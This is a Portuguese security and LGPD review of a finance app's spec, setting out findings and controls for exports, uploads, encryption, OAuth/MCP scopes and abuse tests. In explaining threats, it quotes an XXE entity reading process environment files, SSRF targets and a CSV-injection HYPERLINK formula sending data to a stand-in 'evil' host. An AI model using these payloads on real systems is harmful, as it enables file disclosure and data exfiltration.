**O que está errado.** A rota gera um arquivo com "tudo" e devolve URL assinada (`arquivos.assinarUrl`). Não há: rate limit, reautenticação, restrição de papel, notificação ao titular, TTL declarado do link, escopo declarado da assinatura, nem `exportacoes` como evento de auditoria. Para T3 (sessão roubada) e T5 (token MCP), essa é a rota mais valiosa do produto inteiro — e ela é mais barata de explorar do que paginar 4.000 lançamentos. O meu papel exige explicitamente "alerta de exportação em massa".

**Requisito de controle.**
> (1) `POST /exportacoes` exige papel `proprietario` ou `membro` (nunca `visualizador`) **e** reautenticação (senha ou MFA) quando o escopo for "tudo". (2) Rate limit de 3 por hora e 10 por dia por tenant. (3) Toda exportação gera entrada em `auditoria` **e** notificação imediata por e-mail e push a todos os proprietários, com IP mascarado e horário — o titular precisa saber que seus dados saíram, mesmo que tenha sido ele. (4) A URL assinada tem TTL ≤ 15 min, é de uso único, aponta para domínio distinto do domínio da sessão, e o objeto é servido com `Content-Disposition: attachment` e `Content-Type: application/octet-stream`. (5) `exportacoes.expira_em` ≤ 7 dias, com job que **apaga o objeto do storage**, não apenas a linha. (6) Token MCP e chave de API **não podem** ter escopo que alcance esta rota (ver A-36). Testes: `AB-09`, `AB-10`.

### A-29 · `Crítico` · `POST /sync/mutacoes` e `GET /sync/mudancas?desde=` — endpoints sem contrato

**O que está errado.** §6.3 admite: "são endpoints exclusivos do mobile e **não aparecem em 4.1**... Precisam entrar em `contracts` no épico 5." Enquanto isso, são: um endpoint de **escrita em lote** sem schema, sem teto e sem autorização declarada, e um **changefeed** (`?desde=`) que devolve todas as mudanças do tenant desde um timestamp arbitrário. O changefeed é a rota ideal para T3 exfiltrar incrementalmente sem disparar nenhuma heurística de "exportação". Endpoint sem contrato é, por definição, endpoint sem autorização e sem validação de entrada.

**Requisito de controle.**
> Nenhuma implementação de `apps/mobile` começa antes de `zSyncMutacoes` e `zSyncMudancas` existirem em `packages/contracts`, com: teto de 200 mutações por lote; `id` de mutação idempotente gerado no cliente com `UNIQUE (tenant_id, mutacao_id)` no servidor; autorização por papel idêntica à das rotas equivalentes de §4.1 (uma mutação de lançamento passa pelo mesmo guard de `POST /lancamentos`); `desde` limitado a 90 dias e teto de 1.000 registros por resposta com cursor assinado (A-09); e a mesma contagem de rate limit da rota equivalente. O `PlanoDeSync` de `domain/sincronizacao-offline` **não** é autoridade de autorização — o servidor revalida cada mutação.

### A-30 · `Alto` · `GET /inteligencia/sugerir-categoria` — sem contrato, e envia descrição de transação

**O que está errado.** §6.3: "consumido pelo modal (selo IA) e ainda não tem grupo em 4.1". A rota transporta a descrição de um lançamento — dado pessoal, potencialmente sensível por inferência (ver B-06) — para um destino que o spec não nomeia. Também é uma rota chamada a cada digitação no formulário, ou seja, o candidato natural a amplificador de custo e a canal de vazamento por log de acesso.

**Requisito de controle.** Contrato em `contracts`; método `POST` (não `GET` — descrição em query string vai para log de acesso do Traefik, log do navegador e histórico); rate limit de 60/min por usuário; e o requisito de terceiro de B-18, que é bloqueante.

### A-31 · `Alto` · `POST /anexos` não existe em §4.1

**O que está errado.** A rota aparece no mapa tela→endpoint (§6.1, Modal de lançamento) e a tabela `anexos` existe em §3.6 com a única salvaguarda "Limite de tamanho validado na borda" — sem número. Um endpoint de upload não especificado é um endpoint de upload sem controles. Ver A.4 inteira.

---

## A.4 Upload de OFX/CSV/PDF como entrada hostil

Estado atual do spec: uma frase em §3.6 (`anexos` — "Limite de tamanho validado na borda"), um passo de produto em §2.10, e nada mais. Nenhum número, nenhum timeout, nenhuma menção a XXE, descompressão, sandbox ou tipo de conteúdo. Este é o vetor **T2**, o único que compromete todos os tenants de uma vez.

### A-32 · `Crítico` · XXE no parser de OFX → leitura de arquivo no host → KEK → credenciais bancárias de toda a base

**O que está errado, em cadeia.** OFX 1.x é SGML e OFX 2.x é **XML**. Um parser XML de Node com resolução de DTD e entidades externas habilitada (o padrão de várias bibliotecas) processa `<!ENTITY xxe SYSTEM "file:///proc/self/environ">` e devolve o conteúdo dentro do resultado do parse — que o produto então **exibe de volta ao usuário** no passo 3 (Revisão), na coluna de descrição. O atacante lê `.env`, `docker-compose.yml`, chaves, e — como §3.5 diz apenas que a KEK fica "fora do banco", o que numa VPS auto-hospedada quase sempre significa arquivo ou variável de ambiente no mesmo host — **lê a KEK**. Com a KEK, `dek_cifrada` e `credenciais_cifradas` de todas as conexões de todos os tenants são recuperáveis a partir de qualquer cópia do banco ou de um backup.

O mesmo parser habilita SSRF (`SYSTEM "http://169.254.169.254/..."` ou varredura da rede interna do compose: Postgres, Redis, Traefik) e billion-laughs (negação de serviço com um arquivo de 1 KB).

**Requisito de controle.**
> (1) O parser de OFX/XML roda com DTD **desabilitada**, resolução de entidades externas desabilitada, e sem qualquer resolver de rede ou de filesystem — configuração explícita, não padrão da biblioteca, com teste que alimenta um payload XXE de fixture e exige erro tipado. (2) Limite de profundidade de aninhamento (20) e de número de nós (100.000). (3) O conteúdo parseado **nunca** é ecoado sem escape na revisão. (4) O parsing acontece em processo separado sem variáveis de ambiente de segredo e sem acesso de rede (ver A-34). (5) A KEK sai do host da aplicação (ver A-33). Testes: `AB-11`, `AB-12`.

### A-33 · `Crítico` · Sem limite de tamanho, sem timeout, sem limite de descompressão — "o que acontece com um arquivo de 200 MB" não tem resposta no spec

**Resposta que o spec dá hoje: nenhuma.** Fastify com `@fastify/multipart` sem `limits` bufferiza; o Node estoura o heap; o processo HTTP morre levando **todas** as requisições em voo daquele container — numa VPS de instância única, isso é indisponibilidade total do produto por um upload. Se o arquivo chegar comprimido (`Content-Encoding: gzip`, ou ZIP de extratos, ou os streams `FlateDecode` de um PDF), 200 MB de entrada viram gigabytes na saída.

**Requisito de controle (números, para virar constante nomeada no código).**
> | Controle | Valor |
> |---|---|
> | Corte no Traefik (antes do Node) | 25 MB por requisição |
> | OFX/CSV — tamanho | 10 MB |
> | OFX/CSV — linhas/transações | 20.000 |
> | Anexo (imagem/PDF) — tamanho | 20 MB |
> | Anexos por lançamento | 1 no MVP (já é decisão de produto) |
> | Timeout duro de parsing por arquivo | 30 s, com `SIGKILL` no processo filho |
> | Memória máxima do processo de parsing | 256 MB (`--max-old-space-size` + cgroup) |
> | Razão máxima de descompressão | 100:1, com teto absoluto de 100 MB de saída, verificada **durante** a descompressão em streaming |
> | Uploads simultâneos por tenant | 1 |
>
> O corpo é lido em **streaming** para disco temporário com contagem de bytes; ultrapassar o limite aborta a conexão sem ter bufferizado o arquivo. Rejeição por tamanho retorna 413 com o limite em texto ("arquivos até 10 MB"), coerente com o requisito de produto de §2.10 ("nunca 'erro ao processar'"). Teste: `AB-13` (arquivo de 200 MB → 413 em ≤ 2 s, processo vivo, memória estável).

### A-34 · `Crítico` · OCR/PDF no mesmo processo que tem acesso à KEK e ao banco

**O que está errado.** §5.2 define o job `anexo.ocr` na fila `interativa` do worker; §1.4 põe `inteligencia.lerRecibo(anexoId)` em `apps/api`. O worker é o mesmo processo que executa `sync.executar` e portanto **desembrulha DEKs e usa credenciais bancárias**. PDF é o formato de entrada mais hostil dos três (JavaScript embutido, XFA, streams comprimidos, fontes maliciosas), e bibliotecas de renderização e OCR são código nativo com histórico denso de RCE. Um PDF malicioso executando no worker está no mesmo espaço de memória que as credenciais bancárias em claro.

**Requisito de controle.**
> Parsing de arquivo hostil (OFX, CSV, PDF, imagem) e OCR executam em um **processo filho descartável** por arquivo, com: usuário sem privilégio, sem variáveis de ambiente de segredo (a KEK e a `DATABASE_URL` não existem nesse ambiente), sem acesso de rede (`--network none` no container ou namespace de rede vazio), filesystem somente-leitura exceto um `tmpfs` do tamanho do arquivo, cgroup de memória e CPU, `seccomp` restritivo, e timeout duro. A comunicação é por arquivo de entrada e JSON de saída validado por Zod — o processo pai **não confia** na saída do filho. Nenhum processo que manipula DEK executa parsing de arquivo enviado por usuário. Teste: `AB-14`.

### A-35 · `Alto` · CSV injection na importação e na exportação

**O que está errado.** A descrição de um lançamento é texto livre controlado pelo usuário e sai em `POST /exportacoes` (CSV) e em `⋮ → Exportar (CSV/OFX)` (§2.2). Uma célula começando com `=`, `+`, `-`, `@`, TAB ou CR é interpretada como fórmula por Excel/LibreOffice/Sheets. Vetor concreto no compartilhamento familiar: A insere um lançamento com descrição `=HYPERLINK("http://evil/"&A1,"clique")`, B exporta o CSV do espaço e abre no Excel. Também vale ao contrário: um CSV importado com fórmulas é armazenado e reexportado.

**Requisito de controle.**
> Toda célula de exportação CSV cujo primeiro caractere esteja em `= + - @ \t \r` é prefixada com aspa simples e o campo é sempre citado com aspas duplas com escape de aspas internas. A regra vive em uma função só, em `apps/api/src/arquivos/csv.ts`, com teste de propriedade. Na importação, o valor é armazenado como veio (é dado do usuário) — a defesa é na saída, não na entrada.

### A-36 · `Médio` · Tipo de conteúdo, nome de arquivo e domínio de serviço dos anexos

**Requisito de controle.**
> Aceitação por *magic bytes* (não por extensão nem por `Content-Type` do cliente), com allowlist: `application/pdf`, `image/jpeg`, `image/png`, `image/heic`, `text/csv`, OFX (SGML/XML). **SVG é proibido** (é HTML executável). O `storage_key` é gerado pelo servidor (UUID), nunca deriva do nome enviado; o nome original é guardado como metadado e sanitizado na exibição. Objetos são servidos por URL assinada de TTL ≤ 15 min, em domínio distinto do domínio da sessão, com `Content-Disposition: attachment`, `X-Content-Type-Options: nosniff` e `Content-Security-Policy: sandbox`. O storage não é público e não confia no `storage_key` como segredo: a rota de download revalida sessão, tenant e propriedade do anexo. Teste: `AB-15`.

---

## A.5 Envelope encryption das credenciais de `Conexao`

**O spec admite a lacuna sozinho.** `sistema.md` §7 lista a ADR **0018** como não escrita, com a justificativa: *"Regra 19 diz o quê; falta o como, incluindo o que acontece na rotação e no backup."* Isso é, textualmente, o meu quarto item de veto ("segredo sem envelope encryption"). O que existe hoje são duas colunas (`credenciais_cifradas BYTEA`, `dek_cifrada BYTEA`) e uma frase ("DEK por conexão, KEK fora do banco").

### A-37 · `Crítico` · ADR 0018 ausente: envelope encryption sem algoritmo, sem versão de chave, sem rotação, sem backup

**O que falta, item a item.**

1. **Algoritmo e modo.** Não declarados. Requisito: AES-256-GCM, nonce de 96 bits **aleatório por operação**, jamais reutilizado com a mesma DEK; a estrutura persistida é `versao(1) || nonce(12) || ciphertext || tag(16)`.
2. **AAD.** Ausente. Sem dado autenticado adicional, um blob de credencial pode ser **transplantado** de uma conexão para outra (ou de um tenant para outro) por quem tenha acesso de escrita ao banco, e o desembrulho funciona. Requisito: AAD = `tenant_id || conexao_id || versao_kek`.
3. **`kek_version` não existe no modelo.** `conexoes` tem `dek_cifrada` e nenhuma coluna dizendo **qual** KEK a embrulhou. Sem isso a rotação é impossível de executar incrementalmente: ou tudo é rewrapped num único movimento atômico (indisponibilidade e risco), ou nada é. **Coluna faltando.**
4. **Onde a KEK vive.** "Fora do banco" não é especificação. Numa VPS auto-hospedada isso vira `.env` no mesmo host — que não protege contra os dois vetores mais prováveis: leitura de arquivo (A-32) e backup (item 6).
5. **Rotação.** Sem prazo, sem procedimento, sem janela de duas chaves válidas.
6. **Backup.** O ponto que o próprio §7 aponta e ninguém respondeu. Um `pg_dump` contém `credenciais_cifradas` **e** `dek_cifrada`. Se o backup e a KEK repousam no mesmo host ou no mesmo bucket, o envelope não protege nada: quem leva o backup leva as credenciais.
7. **Descarte (crypto-shredding).** Não declarado — e é o mecanismo que a Parte B precisa para que "revogar" signifique algo (ver B-21).
8. **`usuarios.mfa_segredo_cifrado`** está fora do esquema (A-17).

**Requisito de controle.**
> Escrever a ADR 0018 antes de qualquer código de `conexoes`, contendo:
> - AES-256-GCM, nonce aleatório de 96 bits por operação, AAD = `tenant_id || conexao_id || versao_kek`, formato de blob versionado.
> - Colunas novas em `conexoes`: `kek_versao SMALLINT NOT NULL`, `dek_criada_em TIMESTAMPTZ NOT NULL`.
> - **A KEK não vive no processo da API.** Serviço separado (Vault Transit, KMS, ou um agente local mínimo escutando em socket Unix) que expõe apenas `unwrap(dek_cifrada, aad) → dek` e `wrap(dek, aad)`. A API nunca lê material de KEK; o comprometimento do processo da API não revela a KEK, apenas permite unwrap enquanto o processo vive. Piso mínimo aceitável se o serviço separado for adiado: arquivo com permissão `0400`, dono distinto do usuário do container, montado read-only, ausente da imagem, do repositório e de qualquer backup — **e** ADR registrando essa escolha como dívida com data de revisão.
> - **Rotação:** KEK a cada 12 meses e imediatamente sob suspeita de incidente; DEK a cada renovação de consentimento. Rotação de KEK = rewrap das DEKs (o ciphertext das credenciais não é tocado), com as duas versões de KEK válidas durante a janela, job idempotente por `kek_versao`, e métrica de progresso. Rotação **não** exige indisponibilidade.
> - **Backup:** o destino do backup do Postgres nunca contém a KEK, e a KEK nunca é versionada junto com a infraestrutura. O backup é cifrado em repouso com chave distinta, custodiada em outro lugar. Teste de recuperação **obrigatório e anual**, com dois critérios: (a) a restauração funciona; (b) restaurar sem acesso ao serviço de KEK **não** recupera nenhuma credencial de conexão — provado no relatório de teste.
> - **Descarte:** revogar ou excluir uma conexão zera `dek_cifrada` e `credenciais_cifradas` **na mesma transação** (crypto-shredding), tornando o material irrecuperável mesmo a partir de backups anteriores à revogação, exceto os que contêm a DEK antiga — o que fixa o prazo máximo de retenção de backup como o prazo real de descarte (declarar em B-11).

### A-38 · `Alto` · Credenciais em trânsito e em resposta: o controle está prometido, não construído

**O que está errado.** Regra 19 e §2.11 ("Não tem: exibição de qualquer credencial ou token, em nenhuma circunstância") declaram a intenção. Faltam os mecanismos: `POST /conexoes` recebe credenciais no corpo — o que impede o body de aparecer num log de erro do Fastify, num breadcrumb de APM, numa gravação de sessão do frontend ou num `console.log` de depuração?

**Requisito de controle.**
> (1) Os schemas de `contracts` marcam campos de credencial como *write-only*: `zConexaoResposta` **não possui** os campos, e um teste de S4 falha se possuírem. (2) O serializador do logger opera por **allowlist** com redação por caminho, na borda do logger (regra 20), não no ponto de chamada; campos desconhecidos em objetos de request/response são redigidos por padrão. (3) Nenhum handler de erro serializa `request.body`. (4) Teste de S2 `AB-16`: provoca erro 500 dentro de `POST /conexoes` e afirma que a saída de log não contém nenhum byte do segredo enviado. (5) O mesmo mecanismo cobre `outbox.payload`, `auditoria.de/para` e o corpo de `POST /importacoes`, que são os três outros lugares onde estrutura serializada com PII costuma vazar para o log.

### A-39 · `Médio` · `ip_hash` e `user_agent_hash` são pseudonimização falsa

**O que está errado.** `auditoria.ip_hash` e `consentimentos.ip_hash`/`user_agent_hash`. Um hash simples de endereço IPv4 é reversível por força bruta sobre 2³² entradas em segundos num laptop; `user_agent` tem entropia ainda menor. Um hash sem segredo não pseudonimiza — ele apenas dificulta a leitura por humanos, e cria a ilusão de conformidade (impacta B-09).

**Requisito de controle.**
> `ip_hash = HMAC-SHA256(ip, pepper)` com *pepper* de 256 bits guardado no mesmo serviço de segredos da KEK, rotacionável, jamais no banco. Documentar que a rotação do pepper torna hashes antigos incomparáveis com novos — o que é aceitável e até desejável, pois limita a janela de correlação. Mesma regra para `user_agent_hash`.

---

## A.6 Servidor MCP e chaves de API

O spec menciona a superfície em três lugares e a modela em zero:

- `sistema.md` §1.4: módulo `mcp` — `autorizarCliente`, `escoposDe(token)`, "(pós-MVP)".
- `arquitetura-informacao.md` §2.12: Configurações → Origem dos dados → **"Apps conectados (MCP/OAuth)"** e **"Chaves de API"**; e §3.1: "OAuth para apps de IA: escopo por espaço, leitura por padrão, escrita opt-in, revogável".
- `organizze-teardown.md` §7: o modelo do concorrente, que está correto e que o §8.4 já registra como confirmação da nossa decisão.

Não existe: nenhuma tabela (`clientes_oauth`, `autorizacoes`, `tokens`, `chaves_api`), nenhuma rota em §4.1, nenhum prazo, nenhum log de acesso, nenhuma tela em §6.1, nenhum job de expiração em §5.2. É acesso programático irrestrito e sem prazo a todo o dado financeiro de um espaço, projetado por três frases de prosa.

### A-40 · `Crítico` · Superfície MCP/API keys mencionada e não especificada

**Requisito de controle (ADR + spec próprios, antes do épico 12).**
> **OAuth.**
> - OAuth 2.1: `authorization_code` + **PKCE S256 obrigatório**, sem grant implícito, sem `password` grant; `redirect_uri` registradas e comparadas por igualdade exata; `state` obrigatório.
> - Registro de cliente: manual e revisado enquanto forem poucos; nada de *dynamic client registration* aberto no MVP.
> - **Escopos nomeados e granulares**, apresentados ao usuário em português na tela de autorização: `lancamentos:ler`, `lancamentos:escrever`, `contas:ler`, `cartoes:ler`, `relatorios:ler`, `planejamento:ler`, `planejamento:escrever`. **Somente leitura é o padrão**; escrita é opt-in explícito por caixa desmarcada (copiado do Organizze porque está certo).
> - **Escopos proibidos para qualquer cliente externo, sem exceção:** `conexoes:*` (credenciais bancárias), `exportacoes:*` (A-28), `tenants:*` (gestão de membros), `auth:*`, `atividades:*`. A ausência dessa lista é o achado mais perigoso desta seção: um agente de IA com "leitura" e sem essa proibição chama `POST /exportacoes` e leva tudo em uma requisição.
> - Autorização **por tenant** (o usuário escolhe o espaço), nunca por usuário através de todos os seus tenants.
> - **Prazos:** access token ≤ 15 min; refresh rotativo com detecção de reuso (A-14); a **autorização** expira em 90 dias e exige reconsentimento — nada de acesso perpétuo.
> - **Revogação com efeito imediato:** tokens são opacos e verificados contra o banco/Redis a cada requisição (não JWT auto-contido de longa duração). Revogar na UI corta o acesso em ≤ 60 s, e o teste prova isso.
>
> **Chaves de API.**
> - Formato `mavia_sk_<32 bytes base62>` com prefixo identificável (permite varredura de vazamento em repositórios públicos); exibida **uma única vez**; armazenada como SHA-256; `ultimos_4` guardados para exibição.
> - Escopo obrigatório na criação (mesma lista acima, mesmas proibições) e **expiração obrigatória** (máximo 365 dias, padrão 90). Chave sem prazo não é criável.
> - `ultimo_uso_em` e `ultimo_ip_hash` atualizados; chave sem uso por 90 dias é desativada automaticamente por job, com aviso prévio.
> - Criar, revogar e usar pela primeira vez geram entrada em `auditoria` e notificação ao titular.
>
> **Log de acesso (comum aos dois, e pré-requisito de B-13).**
> - Toda requisição autenticada por token OAuth ou chave de API registra em `auditoria`: cliente, escopo exercido, rota, contagem de registros retornados e horário. A tela Atividades (§2.13) distingue visualmente ator humano de ator programático — "quem mexeu nisso" precisa poder responder "o app X, via MCP, às 03:12".
> - Rate limit próprio, mais restritivo que o de sessão humana, e alerta ao titular quando um cliente lê acima do seu percentil normal.

---

## A.7 Achados transversais

### A-41 · `Alto` · Onde os tokens vivem no cliente não está decidido

**O que está errado.** §4 diz "autenticação por bearer" e o spec para aí. `apps/web` é Next.js App Router: se o refresh token for para `localStorage`, qualquer XSS (inclusive via uma dependência de gráfico ou via conteúdo refletido do passo de revisão da importação — A-32) resulta em sessão permanente roubada. Se for para cookie, faltam `HttpOnly`, `Secure`, `SameSite` e proteção CSRF nas rotas de escrita. Não há uma linha sobre cabeçalhos de segurança (CSP, HSTS, `X-Frame-Options`, `Referrer-Policy`) em nenhum documento, embora o Traefik esteja na stack.

**Requisito de controle.**
> Decidir e escrever: refresh token em cookie `HttpOnly; Secure; SameSite=Lax; Path=/v1/auth/refresh`, access token em memória do processo do cliente (nunca em `localStorage` nem `sessionStorage`). Rotas de escrita exigem cabeçalho `X-Mavia-CSRF` correspondente a cookie de dupla submissão, ou `SameSite=Strict` mais verificação de `Origin`. Traefik aplica: `Content-Security-Policy` com `default-src 'self'` e sem `unsafe-inline` (Next.js com nonce), `Strict-Transport-Security` com `preload`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` negando geolocalização, câmera e microfone (coerente com a decisão de produto de §2.3, que já recusou geolocalização). No mobile: refresh no Keychain/Keystore com exigência de autenticação de usuário; **certificate pinning** para o domínio da API.

### A-42 · `Médio` · Cadeia de dependências sem controle declarado

**O que está errado.** O agente exige "lockfile fixado; auditoria no CI; nenhuma dependência nova sem checagem". A stack adiciona parsers de OFX, CSV, PDF e OCR — exatamente a categoria de dependência com pior histórico e menor manutenção. Nada nos documentos de arquitetura ou de pipeline trata disso.

**Requisito de controle.**
> `pnpm-lock.yaml` versionado; CI roda `pnpm audit --audit-level=high` e falha; `pnpm config set minimumReleaseAge 7d` (ou equivalente) para não consumir versão publicada há minutos; toda dependência nova exige justificativa de uma linha no PR com contagem de dependências transitivas; parsers de formato hostil são avaliados por manutenção ativa e superfície nativa antes da escolha, e a decisão vira nota no ADR 0003. Dependabot/Renovade com PRs agrupados, semanais.

### A-43 · `Médio` · Valor monetário no corpo de notificação push e e-mail

**O que está errado.** `notificacoes.payload JSONB` alimenta canais `push | email | inapp`. Um push "Fatura do Nubank fecha amanhã: R$ 4.312,90" aparece na tela de bloqueio, passa por APNs/FCM e por um provedor SMTP. A regra 20 proíbe valor em log; o mesmo raciocínio vale, com mais força, para um canal fora do sistema e visível a quem estiver perto do aparelho. Isto é simultaneamente achado AppSec e LGPD (B-08).

**Requisito de controle.**
> O payload que sai para push e e-mail contém tipo de evento e identificador de destino, **nunca** valor monetário nem descrição de lançamento. O texto é montado no dispositivo (notificação de dados) ou é genérico ("Sua fatura do cartão fecha amanhã. Abra o app."). Preferência do titular para incluir valores é opt-in explícito, desligada por padrão, e nunca vale para o canal e-mail.

---

## A.8 Casos de abuso — entrega ao `engenheiro-qa-automacao`

Um controle sem teste é uma intenção. Cada caso abaixo é um teste automatizado, com o seam declarado conforme §2.2 do `sistema.md`. O orçamento de seam é respeitado: **nenhum seam novo**.

| ID | Caso de abuso | Seam | Achado |
|---|---|---|---|
| `AB-01` | 100 tentativas de login com senha errada no mesmo e-mail: bloqueio progressivo dispara, e `/senha/recuperar` responde igual para e-mail existente e inexistente (corpo e tempo) | S2 | A-13 |
| `AB-02` | Refresh token usado duas vezes: a segunda revoga a família inteira e as sessões param de funcionar | S2 | A-14 |
| `AB-03` | Cursor de paginação forjado — MAC inválido, tenant alheio, filtro trocado, `posted_at` não parseável: 400 genérico, mesma forma para os quatro; cursor de outro tenant nunca retorna linha | S2 | A-09, A-10 |
| `AB-04` | `membro` chama `PATCH /tenants/:id/membros/<ele mesmo>` promovendo-se a `proprietario`: 403 | S2 | A-19 |
| `AB-05` | `:id` de tenant no path diferente do tenant da sessão, em todas as quatro rotas de `/tenants`: 403 e zero linhas lidas | S2 | A-19 |
| `AB-06` | `DELETE /lancamentos/:id` sobre uma perna de transferência e sobre uma parcela isolada: 409, e a soma das pernas continua zero | S2 | A-23 |
| `AB-07` | Nenhuma resposta de API de qualquer rota contém `payload`, `credenciais_cifradas`, `dek_cifrada`, `senha_hash`, `refresh_hash`, `mfa_segredo_cifrado`, `ip_hash` — varredura sobre o OpenAPI gerado + asserção nas respostas reais | S4 + S2 | A-25, A-38 |
| `AB-08` | Membro A marca como lida a notificação de B e escreve a preferência de B, no mesmo tenant: 403 nos dois | S2 | A-27 |
| `AB-09` | 5 chamadas seguidas a `POST /exportacoes`: a 4ª é 429, e cada chamada bem-sucedida gerou notificação aos proprietários | S2 | A-28 |
| `AB-10` | URL assinada de exportação: expira em 15 min, é de uso único, e não funciona com a sessão de outro tenant | S2 | A-28 |
| `AB-11` | OFX com entidade externa (`file:///etc/passwd` e `http://127.0.0.1:6379/`): erro tipado, nenhum conteúdo de arquivo na resposta, nenhuma conexão de rede saindo do processo de parsing | S3 | A-32 |
| `AB-12` | OFX billion-laughs de 1 KB: erro em ≤ 30 s, memória do processo estável | S3 | A-32 |
| `AB-13` | Upload de 200 MB: 413 em ≤ 2 s, processo HTTP vivo, heap estável, nada gravado em `lancamentos_brutos` | S2 | A-33 |
| `AB-14` | PDF malicioso (JS embutido + bomba de descompressão) no `anexo.ocr`: processo filho morre no timeout, o worker sobrevive, e o processo de OCR comprovadamente não tem a variável de ambiente da KEK nem acesso de rede | S2 | A-34 |
| `AB-15` | Upload de SVG e de HTML renomeados para `.png`: rejeitados por magic bytes; anexo servido com `Content-Disposition: attachment` e de domínio distinto | S2 | A-36 |
| `AB-16` | Erro 500 forçado dentro de `POST /conexoes`: a saída de log não contém nenhum byte do segredo enviado, nem o body serializado | S2 | A-38 |
| `AB-17` | CSV exportado com descrição `=HYPERLINK(...)`: a célula sai prefixada e citada | S1 + S2 | A-35 |
| `AB-18` | Token MCP com escopo `lancamentos:ler` tenta `POST /exportacoes`, `GET /conexoes` e `POST /lancamentos`: 403 nos três; revogar o token corta o acesso em ≤ 60 s | S2 | A-40 |
| `AB-19` | Job `sync.executar` roda com `mavia_jobs` **sem** `SET LOCAL app.tenant_id`: falha em vez de ler; e `SELECT count(*) FROM outbox` retorna 0 | S2 | A-01, A-02 |
| `AB-20` | Requisição em pool reaproveitado: tenant A seguido de tenant B na mesma conexão física — B não enxerga nada de A (o teste do ADR 0004, mas explicitamente sobre reuso de conexão) | S2 | A-03 |
| `AB-21` | `GET /relatorios/categorias?de=1900-01-01&ate=2100-12-31`: 400 por janela excessiva, sem consultar o banco | S2 | A-22 |
| `AB-22` | `POST /lancamentos/lote` com 10.000 ids: 400; com 500 ids dos quais 1 é de outro tenant: nenhuma escrita ocorre (transação inteira revertida) | S2 | A-21 |

---
---

# PARTE B — LGPD (Lei 13.709/2018)

Este produto trata dado pessoal **e** dado financeiro, e — como B-06 demonstra — coleta dado sensível por inferência sem ter decidido isso. As perguntas abaixo são baratas agora e caras depois.

## B.1 Mapa de dados — finalidade, base legal, retenção, descarte

Uma linha por dado pessoal que o spec coleta. **Finalidade em uma frase**: se não coube, a finalidade não está clara. As células marcadas **`FALTA`** são achados, não descrições.

### B.1.1 Identidade e acesso

| Dado (origem no spec) | Finalidade | Base legal | Retenção | Descarte |
|---|---|---|---|---|
| `usuarios.email` (§3.1) | Identificar e autenticar a pessoa que acessa o espaço | Execução de contrato (art. 7º V) | Vida da conta | **`FALTA`** — nenhum mecanismo (B-11) |
| `usuarios.senha_hash` | Provar que quem acessa é quem diz ser | Execução de contrato | Vida da conta | **`FALTA`** |
| `usuarios.nome` | Atribuir ações a pessoas no espaço compartilhado | Execução de contrato | Vida da conta | **`FALTA`** |
| `usuarios.mfa_segredo_cifrado` | Verificar o segundo fator no login | Execução de contrato + legítimo interesse (segurança, art. 7º IX) | Vida da conta ou até desativar MFA | **`FALTA`** — e sem chave definida (A-17) |
| `usuarios.ultimo_acesso_em` | Detectar conta comprometida e conta inativa | Legítimo interesse | Vida da conta | Com a conta |
| `sessoes.*` (dispositivo, `refresh_hash`) | Manter a sessão aberta e permitir revogá-la | Execução de contrato + legítimo interesse | **Proposto:** 90 dias após expirar/revogar | **`FALTA`** — nenhum job |
| `tenant_usuarios` (`convidado_por`, `aceito_em`) | Registrar quem entrou no espaço, quando e a convite de quem | Execução de contrato | Vida do vínculo + 5 anos (prova) | **`FALTA`** |
| E-mail de convidado ainda não cadastrado (§4.1 `POST /convites`) | Enviar o convite para o espaço | Legítimo interesse do titular convidante | **Proposto:** 30 dias, ou até o aceite | **`FALTA`** — dado de **terceiro** (B-15) |

### B.1.2 Dados financeiros e comportamentais

| Dado | Finalidade | Base legal | Retenção | Descarte |
|---|---|---|---|---|
| `lancamentos.descricao` / `observacao` (§3.3) | Permitir que o titular reconheça e classifique o próprio movimento de dinheiro | Execução de contrato | Vida do espaço | Só soft delete (B-11) |
| `lancamentos.valor_centavos`, `posted_at`, `effective_at`, `conta_id`/`cartao_id` | Calcular saldo, fatura e relatórios | Execução de contrato | Vida do espaço | Só soft delete |
| `lancamentos.criado_por` | Dizer, no espaço compartilhado, quem lançou | Execução de contrato | Vida do espaço | Precisa pseudonimizar na saída do membro (B-16) |
| `objetivos.nome` (§3.4) | Nomear o que o titular está juntando dinheiro para fazer | Execução de contrato | Vida do espaço | **`FALTA`** — ver B-06 |
| `anexos` (recibo, nota, comprovante) | Guardar o comprovante do lançamento | Execução de contrato | **`FALTA`** — nenhum prazo | **`FALTA`** — B-12 |
| `saldo_snapshots` | Acelerar a leitura de saldo | Execução de contrato (derivado) | Derivado — descartável a qualquer momento | Declarar como derivado |
| `preferencias` | Guardar como o titular quer ver o produto | Execução de contrato | Vida do vínculo | Com o vínculo |
| `notificacoes.payload` (§3.6) | Avisar o titular de um evento do seu dinheiro | Execução de contrato / consentimento por canal | **Proposto:** 180 dias | **`FALTA`** — e sai para terceiros (B-08) |

### B.1.3 Ingestão bancária

| Dado | Finalidade | Base legal | Retenção | Descarte |
|---|---|---|---|---|
| `conexoes.credenciais_cifradas` / `dek_cifrada` (§3.5) | Autorizar a Mavia a ler o extrato daquela instituição | **Consentimento** (art. 7º I), específico e destacado | Até revogação ou `valida_ate` | Crypto-shredding — **`FALTA` declarar** (A-37, B-21) |
| `conexoes.escopo`, `instituicao`, `valida_ate` | Mostrar ao titular o que foi autorizado e até quando | Consentimento + transparência (art. 9º) | Vida da conexão + 5 anos como prova | **`FALTA`** |
| `consentimentos.*` (`versao_texto`, `ip_hash`, `user_agent_hash`, datas) | **Provar** que o consentimento foi dado, quando, por quem e para quê | Obrigação legal / exercício de direito (art. 7º II e VI); o ônus da prova é do controlador (art. 8º §2º) | **Proposto:** 5 anos após a revogação | Expurgo por job — **`FALTA`** |
| `lancamentos_brutos.payload JSONB` | Preservar o registro cru para auditar e reprocessar a importação | Execução de contrato | **`FALTA`** — "preservado para auditoria" não é prazo | **`FALTA`** — B-07, **veto** |
| `sincronizacoes.*` | Mostrar o histórico de sincronizações e diagnosticar falha | Execução de contrato | **Proposto:** 12 meses | **`FALTA`** |
| `conciliacao_sugestoes`, `regras_categorizacao` | Casar importado com manual; classificar automaticamente | Execução de contrato | Vida do espaço / até 90 dias após decisão | **`FALTA`** |

### B.1.4 Registro e segurança

| Dado | Finalidade | Base legal | Retenção | Descarte |
|---|---|---|---|---|
